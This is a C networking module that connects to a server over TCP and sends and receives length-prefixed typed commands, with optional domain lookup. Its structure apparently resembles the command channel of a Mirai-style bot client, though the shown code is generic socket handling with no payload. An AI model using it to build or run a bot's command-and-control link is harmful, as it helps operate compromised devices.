#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#include "includes.h"
#include "network.h"
#ifdef SERVER_DOMAIN
#include "resolv.h"
#endif

/* Functionality:
Contains all network code related to communicating with the server.
*/

// Local function
static BOOL recv_full(int, void *, size_t);

BOOL send_data(int sockfd, const void *data, int data_len) {
  if (send(sockfd, data, data_len, MSG_NOSIGNAL) == -1) {
#ifdef DEBUG
    printf("[network] Failed to call send(), errno %d\n", errno);
#endif
    return FALSE;
  }

  return TRUE;
}

BOOL send_command(int sockfd, command *cmd) {
  // Send data length in network byte order
  uint16_t data_len_ns = htons(cmd->data_len);
  if (!send_data(sockfd, &data_len_ns, sizeof(data_len_ns))) {
    return FALSE;
  }

  // Send data type
  if (!send_data(sockfd, &cmd->type, sizeof(cmd->type))) {
    return FALSE;
  }

  if (cmd->data_len > 0) {
    // Send data
    if (!send_data(sockfd, cmd->data, cmd->data_len)) {
      return FALSE;
    }
  }

#ifdef DEBUG
  printf("[network] Sending command type %x with length %u\n", cmd->type,
         cmd->data_len);
#endif

  return TRUE;
}

command *receive_command(int sockfd) {
  // Receive command length from server
  uint16_t cmd_len;
  if (!recv_full(sockfd, &cmd_len, sizeof(cmd_len))) {
    return NULL;
  }

  // Check if received command length is allowed
  cmd_len = ntohs(cmd_len);
  if (cmd_len > CMD_MAX_LENGTH) {
#ifdef DEBUG
    printf("[network] Received command length is too big: %u\n", cmd_len);
#endif
    return NULL;
  }

  // Receive command type
  char cmd_type;
  if (!recv_full(sockfd, &cmd_type, sizeof(cmd_type))) {
    return NULL;
  }

  char *cmd_data = NULL;
  if (cmd_len > 0) {
    // Receive command data
    cmd_data = malloc(sizeof(char) * cmd_len);
    if (cmd_data == NULL) {
#ifdef DEBUG
      printf("[network] Failed to call malloc()\n");
#endif
      return NULL;
    }
    if (!recv_full(sockfd, cmd_data, cmd_len)) {
      free(cmd_data);
      return NULL;
    }
  }

#ifdef DEBUG
  printf("[network] Received command with type %02x and data length %u\n",
         cmd_type, cmd_len);
#endif
  // Create command struct
  // This struct and the data pointer should be freed after use
  command *cmd = malloc(sizeof(command));
  if (cmd == NULL) {
#ifdef DEBUG
    printf("[network] Failed to call malloc()\n");
#endif
    free(cmd_data);
    return NULL;
  }
  cmd->type = cmd_type;
  cmd->data_len = cmd_len;
  cmd->data = cmd_data;

  return cmd;
}

static BOOL recv_full(int sockfd, void *buf, size_t to_read) {
  int total_read = 0;
  while (to_read > 0) {
    errno = 0;
    int n = recv(sockfd, buf + total_read, to_read, MSG_NOSIGNAL);
    if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR) {
      sleep(1);
      continue;
    } else if (n == 0 || n == -1) {
#ifdef DEBUG
      printf("[network] Failed to call recv(), errno %d\n", errno);
#endif
      return FALSE;
    }

    to_read -= n;
    total_read += n;
  }

  return TRUE;
}

int connect_nonblock(uint32_t ip, uint16_t port) {
  // Setup socket
  int sockfd;
  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
#ifdef DEBUG
    printf("[network] Failed to call socket(), errno %d\n", errno);
#endif
    return -1;
  }

  // Set socket to nonblocking
  if (fcntl(sockfd, F_SETFL, O_NONBLOCK | fcntl(sockfd, F_GETFL, 0)) == -1) {
#ifdef DEBUG
    printf("[network] Failed to call fcntl(), errno %d\n", errno);
#endif
    close(sockfd);
    return -1;
  }

  // Setup socket address
  struct sockaddr_in srv_addr;
  memset(&srv_addr, 0, sizeof(srv_addr));
  srv_addr.sin_family = AF_INET;
  srv_addr.sin_addr.s_addr = ip;
  srv_addr.sin_port = htons(port);

  // Connect to server asynchronously
  connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));

#ifdef DEBUG
  printf("[network] Attempting to connect to %s:%u\n",
         inet_ntoa(srv_addr.sin_addr), port);
#endif

  return sockfd;
}

int connect_block(uint32_t ip, uint16_t port) {
#ifdef DEBUG
  printf("[network] Attempting to connect to server\n");
#endif

  // Setup socket
  int sockfd;
  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
#ifdef DEBUG
    printf("[network] Failed to call socket(), errno %d\n", errno);
#endif
    return -1;
  }

  // Set socket timeout
  struct timeval timeout;
  timeout.tv_sec = 10;
  timeout.tv_usec = 0;
  if (setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout,
                 sizeof(timeout)) < 0) {
#ifdef DEBUG
    printf("[network] Failed to call setsockopt(), errno %d\n", errno);
#endif
    close(sockfd);
    return -1;
  }

  // Setup socket address
  struct sockaddr_in srv_addr;
  memset(&srv_addr, 0, sizeof(srv_addr));
  srv_addr.sin_family = AF_INET;
  srv_addr.sin_addr.s_addr = ip;
  srv_addr.sin_port = htons(port);

  // Connect to server
  if (connect(sockfd, (struct sockaddr *)&srv_addr,
              sizeof(struct sockaddr_in)) < 0) {
#ifdef DEBUG
    printf("[network] Failed to call connect(), errno %d\n", errno);
#endif
    close(sockfd);
    return -1;
  }

#ifdef DEBUG
  printf("[network] Connected to %s:%u\n", inet_ntoa(srv_addr.sin_addr), port);
#endif

  return sockfd;
}

#ifdef SERVER_DOMAIN
uint32_t lookup_domain(char *domain) {
  struct resolv_entries *entries;

  if ((entries = resolv_lookup(domain)) == NULL) {
#ifdef DEBUG
    printf("[network] Failed to resolve server domain\n");
#endif
    return -1;
  }
  uint32_t ip = entries->addrs[rand() % entries->addrs_len];
  resolv_entries_free(entries);

  return ip;
}
#endif
